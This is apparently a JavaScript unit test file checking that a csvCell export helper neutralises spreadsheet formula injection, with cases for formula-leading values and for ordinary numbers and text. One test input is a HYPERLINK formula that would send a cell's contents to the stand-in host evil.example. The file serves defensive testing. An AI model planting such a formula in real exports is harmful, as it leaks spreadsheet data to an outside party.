import test from 'node:test';
import assert from 'node:assert/strict';
import { csvCell } from '../src/components/shared/exportCsv.js';

test('csvCell neutralizes formula-leading values', () => {
  assert.equal(csvCell('=1+1'), "'=1+1");
  assert.equal(csvCell('+1'), "'+1");
  assert.equal(csvCell('-2+3'), "'-2+3");
  assert.equal(csvCell('@SUM(A1)'), "'@SUM(A1)");
  assert.equal(csvCell('\tx'), "'\tx");
  assert.equal(csvCell(' =x'), "' =x");
  assert.equal(csvCell('\r=x'), `"'\r=x"`);
  assert.equal(csvCell('=HYPERLINK("https://evil.example/?d="&A1,"x")'), `"'=HYPERLINK(""https://evil.example/?d=""&A1,""x"")"`);
});

test('csvCell keeps numbers and ordinary text intact', () => {
  assert.equal(csvCell(-7), '-7');
  assert.equal(csvCell('-5.25'), '-5.25');
  assert.equal(csvCell(42), '42');
  assert.equal(csvCell(null), '');
  assert.equal(csvCell('Acme Signs'), 'Acme Signs');
  assert.equal(csvCell('Acme, Inc.'), '"Acme, Inc."');
  assert.equal(csvCell('a"b'), '"a""b"');
});
